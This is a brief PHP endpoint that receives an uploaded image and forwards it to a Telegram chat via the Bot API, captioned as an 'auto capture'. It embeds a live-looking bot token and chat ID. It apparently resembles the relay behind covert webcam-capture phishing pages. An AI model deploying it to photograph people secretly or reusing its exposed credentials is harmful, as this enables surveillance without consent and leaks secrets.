<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die('Method Not Allowed');
}

if (!isset($_FILES['image']) || $_FILES['image']['error'] !== UPLOAD_ERR_OK) {
    http_response_code(400);
    die('No image uploaded');
}

// Save temporarily
$tmpFile = $_FILES['image']['tmp_name'];
$filepath = sys_get_temp_dir() . '/snap_' . uniqid() . '.jpg';
move_uploaded_file($tmpFile, $filepath);

// YOUR TELEGRAM CREDENTIALS
$botToken = '7789208063:AAGJnbnn6qKkqhifWpQ_slUlrXahwAvxkx0';
$chatId   = '1660407337'; // ←←← REPLACE THIS WITH YOUR REAL CHAT ID

// Send to Telegram
$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chatId,
    'photo' => new CURLFile($filepath),
    'caption' => "📸 Auto capture at " . date('Y-m-d H:i:s')
]);

$result = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

unlink($filepath); // cleanup

if ($httpCode === 200) {
    echo "OK";
} else {
    error_log("Telegram send failed: " . $result);
    http_response_code(500);
}
?>
